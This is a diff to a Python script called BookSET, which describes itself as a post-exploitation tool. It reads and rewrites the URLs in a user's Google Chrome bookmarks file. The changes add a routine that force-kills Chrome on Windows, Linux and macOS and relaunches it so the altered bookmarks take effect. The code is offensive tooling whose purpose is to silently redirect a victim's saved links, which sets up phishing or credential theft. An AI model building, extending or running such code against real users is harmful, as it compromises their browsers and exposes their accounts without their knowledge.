@@ -3,6 +3,9 @@ import os
 import json
 import pyfiglet
 import platform
+import subprocess
+import psutil
+import time
 
 
 def detect_os():
@@ -28,7 +31,7 @@ def get_bookmarks_path():
     elif os_name == "mac":
         bookmarks_path = os.path.join(home_dir, "Library", "Application Support", "Google", "Chrome", "Default", "Bookmarks")
     else:
-        raise OSError("something its wrong :( ")
+        raise OSError("something its wrong :( \n\r")
 
     return bookmarks_path
 
@@ -57,13 +60,21 @@ def replace_bookmark_urls():
     with open(get_bookmarks_path(), "w", encoding="utf-8") as f:
         json.dump(bookmarks, f, ensure_ascii=False, indent=2)
 
-    print("[+] URLs modified: ")
-    print()
-    for url in modified_urls:
-        print("     [-]",url)
+    if len(modified_urls) <= 0 :
+        print("[+] There's nothing to Modify :( \n\r")
+        
+    else:    
+        print("[+] URLs modified: \n\r")
+        print()
+        for url in modified_urls:
+            print("     [-]",url)
+        
+        print()    
+        print("[+] Total of BookMarks replaced : [{0}]".format(num_urls_mod))
+        
+        close_chrome()
     
-    print()    
-    print("[+] Total of BookMarks replaced : [{0}]".format(num_urls_mod))
+
         
 def recon_bookmarks():
     bookmarks = read_bookmarks()
@@ -71,21 +82,78 @@ def recon_bookmarks():
     for bookmark in bookmarks["roots"]["bookmark_bar"]["children"]:
         if "url" in bookmark:
             urls.append(bookmark["url"])
-    print("[+] Getting Urls from BookMarks: ")
-    print()
+    print("[+] Getting Urls from BookMarks: \n\r")
+
     for url in urls:
-        print("     [-] ",url)
-    print()        
-    print("[+] Total of BookMarks identified: [{0}]".format(len(urls)))
+        print("     [-] ",url," \n\r")
+      
+    print("[+] Total of BookMarks identified: [{0}] \n\r".format(len(urls)))
+    
+    
+def close_chrome():
+
+    running = 0
+    url = "https://www.google.com"
+    
+    for proc in psutil.process_iter(['pid', 'name']):
+        if 'chrome' in proc.info['name'].lower():
+
+            running = 1
+            break
+    
+    if running == 1 :
+        print("Chrome it's running !! \n\r")
+        os_name = detect_os()
+        if platform.system() == "Windows":
+            subprocess.Popen("taskkill /f /im chrome.exe")
+
+            print("[+] Chrome was Closed ! \n\r")
+            time.sleep(4)
+            
+            chrome_path = "C:/Program Files/Google/Chrome/Application/chrome.exe"
+            print("\n\r[+] Opening Chrome ! \n\r")
+            time.sleep(0.80)
+            print("[+] Done !! \n\r")
+
+            subprocess.Popen([chrome_path, url])
+
+        elif platform.system() == "Linux":
+            subprocess.Popen(["pkill", "chrome"])
+
+            print("Chrome was Closed ! \n\r")
+            time.sleep(4)
+            
+            chrome_path = "/usr/bin/google-chrome"
+            print("\n\r[+] Opening Chrome ! \n\r")
+            time.sleep(0.80)
+            print("[+] Done !! \n\r")
+            subprocess.Popen([chrome_path, url])
+    
+        elif platform.system() == "Darwin":
+            subprocess.Popen(["killall", "Google Chrome"])
+
+            print("Chrome was Closed ! \n\r")
+            time.sleep(4)
+            
+            chrome_path = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
+            print("\n\r[+] Opening Chrome ! \n\r")
+            time.sleep(0.80)
+            print("[+] Done !! \n\r")
+            subprocess.Popen([chrome_path, url])   
+        
+    else:
+        print("[+] Chrome isn't running ! \n\r")
+         
+    
 if __name__ == "__main__":
     
     banner = "BookSET"
     ASCII_art_1 = pyfiglet.figlet_format(banner)
 
-    print()
+ 
     print(ASCII_art_1)
-    print("[ just a simple post-exploitation tool :) by @_mrpack ]")
-    print()
+    print("[ just a simple post-exploitation tool :) by @_mrpack ] \n\r")
+ 
     parser = argparse.ArgumentParser(description="Get and Replace all Urls from Google Chrome BookMarks")
     parser.add_argument("-recon", action="store_true", help="Get all URLs Bookmarks")
     parser.add_argument("-replace", action="store_true", help="Replace URLs Bookmarks")
